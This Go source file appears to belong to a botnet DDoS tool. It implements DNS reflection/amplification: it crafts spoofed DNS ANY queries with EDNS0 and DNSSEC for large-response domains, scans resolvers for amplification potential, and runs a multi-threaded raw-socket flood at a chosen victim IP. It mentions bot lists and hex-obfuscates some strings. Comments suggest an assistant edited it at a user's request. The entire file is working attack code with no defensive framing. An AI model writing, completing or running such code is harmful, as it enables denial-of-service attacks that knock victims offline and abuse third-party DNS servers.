package main

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"strings"
	"sync"
	"time"
)

func buildDNSAny(victimIP net.IP, victimPort uint16, resolverIP net.IP, localRand *rand.Rand) []byte {
	// DNS Query for ANY type with EDNS0 and DNSSEC OK (DO) bit
	// FIX БАГ №8: Correct 12-byte DNS header (6 x uint16).
	// Previous header had 14 bytes due to duplication, causing FORMERR responses.
	dns := []byte{
		0x12, 0x34, // Transaction ID (randomised below)
		0x01, 0x20, // Flags: standard query + AD bit
		0x00, 0x01, // QDCOUNT = 1 (one question)
		0x00, 0x00, // ANCOUNT = 0
		0x00, 0x00, // NSCOUNT = 0
		0x00, 0x01, // ARCOUNT = 1 (EDNS0 OPT RR below)
	}
	
	// Transaction ID (randomised below)
	
	// Question: Use high-amplification domains that return large DNSSEC responses
	question := []byte{
		// "isc.org" — known to produce large DNSSEC ANY responses
		0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00,
		0x00, 0xff, // Type: ANY
		0x00, 0x01, // Class: IN
	}
	dns = append(dns, question...)

	// EDNS0 OPT RR
	edns := []byte{
		0x00,       // Name: <Root>
		0x00, 0x29, // Type: OPT
		0x10, 0x00, // 4096 Payload Size
		0x00, 0x00,
		0x80, 0x00, // DNSSEC OK (DO bit)
		0x00, 0x00, // Data Length
	}
	dns = append(dns, edns...)

	// Set random Transaction ID
	binary.BigEndian.PutUint16(dns[0:], uint16(localRand.Intn(65535)))

	packet := buildSpoofedUDPLocal(victimIP, victimPort, resolverIP, 53, dns, localRand)
	return packet
}

// Pre-built DNS amplification query payloads for high-performance rotation.
// FIX P3: Avoid per-packet slice allocation.
var dnsQueryPayloads [][]byte

func init() {
	domains := []string{"isc.org", "isoc.org", "root-servers.net", "icann.org", "ripe.net"}
	for _, domain := range domains {
		parts := strings.Split(domain, ".")
		payload := []byte{0x12, 0x34, 0x01, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01}
		for _, p := range parts {
			payload = append(payload, byte(len(p)))
			payload = append(payload, p...)
		}
		payload = append(payload, 0x00, 0x00, 0xff, 0x00, 0x01, 0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00)
		dnsQueryPayloads = append(dnsQueryPayloads, payload)
	}
}

// ScanDNSReflectors checks a list of DNS resolvers for amplification support.
// It returns a list of resolvers that responded with significant data.
func ScanDNSReflectors(ctx context.Context, resolvers []string) []string {
	var active []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 100) // Limit concurrency

	for _, addr := range resolvers {
		wg.Add(1)
		go func(address string) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
				defer func() { <-sem }()
			case <-ctx.Done():
				return
			}

			conn, err := net.DialTimeout("udp", address, 2*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()

			// Payload as requested by user
			query := []byte{
				0x12, 0x34, // ID
				0x01, 0x20, // Flags
				0x00, 0x01, // 1 Question
				0x00, 0x00, 0x00, 0x00,
				0x00, 0x01, // 1 Additional
				0x06, 't', 'a', 'r', 'g', 'e', 't', 0x03, 'c', 'o', 'm', 0x00,
				0x00, 0xff, // Type: ANY
				0x00, 0x01, // Class: IN
				0x00,       // Name: <Root>
				0x00, 0x29, // Type: OPT
				0x10, 0x00, // 4096 Payload Size
				0x00, 0x00,
				0x80, 0x00, // DNSSEC OK (DO bit)
				0x00, 0x00, // Data Length
			}

			conn.Write(query)
			
			buffer := make([]byte, 4096)
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, err := conn.Read(buffer)
			if err != nil {
				return
			}

			// If response is significantly larger than query (baseline query len is 45)
			// User said: if there is at least something (like DNSSEC), save it.
			if n > len(query)*2 || (n > 0 && (buffer[11] > 0 || buffer[3] & 0x80 != 0)) { // Simple check for amplification or DNSSEC response
				mu.Lock()
				active = append(active, address)
				mu.Unlock()
			}
		}(addr)
	}

	wg.Wait()
	return active
}

func startDnsAmp(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, resolvers []ReflectorData, threads int, duration time.Duration, pps int) {
	// FIX БАГ №6: Windows raw socket spoofing is usually blocked by OS/ISP (BCP-38)
	if runtime.GOOS == "windows" {
		LogWarn("DNS_AMP", "Raw UDP spoofing is unreliable on Windows (WFP/ISP BCP-38 filtering). Use Linux bots for reliable reflection attacks.")
	}
	fmt.Printf("[!] Starting DNS Amplification on %s:%d for %v with %d threads (PPS: %d)\n", targetIP, targetPort, duration, threads, pps)

	var wg sync.WaitGroup

	victimIP := net.ParseIP(targetIP).To4()
	if victimIP == nil {
		fmt.Printf("[ERR] Invalid target IP: %s\n", targetIP)
		return
	}

	var parsedResolvers []net.IP
	for _, r := range resolvers {
		cleanIP := r.Addr
		if h, _, err := net.SplitHostPort(r.Addr); err == nil {
			cleanIP = h
		}
		if ip := net.ParseIP(cleanIP).To4(); ip != nil {
			parsedResolvers = append(parsedResolvers, ip)
		}
	}

	if len(parsedResolvers) == 0 {
		LogErr(func() string { b, _ := hex.DecodeString("444e535f414d50"); return string(b) }(), func() string { b, _ := hex.DecodeString("41626f727465643a204e6f2076616c696420444e53207265666c6563746f7273206c6f616465642e20436865636b20626f74732e6a736f6e207479706520746167732e"); return string(b) }())
		fmt.Printf("[ERR] No valid DNS resolvers found. Please check bots.json for type:'dns' tags.\n")
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() {
				if r := recover(); r != nil {
					LogErr("SYS", "Panic in DNS: %v", r) // Changed "DNS amp" to "DNS"
				}
			}()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			// Socket per thread
			sockFd, err := openRawSocket(IPPROTO_UDP)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			udpBuf := make([]byte, 1500) // Added for buffer reuse

			for {
				// High-performance batching
				batchSize := 64
				if pps > 0 {
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						// Using parsedResolvers as parsedReflectors was not defined in the original context
						reflIP := parsedResolvers[localRand.Intn(len(parsedResolvers))]

						// FIX P3: Use pre-built payload table — no per-packet allocation
						payload := dnsQueryPayloads[localRand.Intn(len(dnsQueryPayloads))]

						// Assuming buildSpoofedUDPLocalOptimized is a new function that uses udpBuf
						// and buildSpoofedUDPLocal is no longer used in this path.
						packet := buildSpoofedUDPLocalOptimized(victimIP, uint16(targetPort), reflIP, 53, payload, localRand, udpBuf)

						if sockFd != InvalidSocket {
							sendtoRaw(sockFd, packet, reflIP, 53)
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[OK] DNS Amplification finished\n")
}
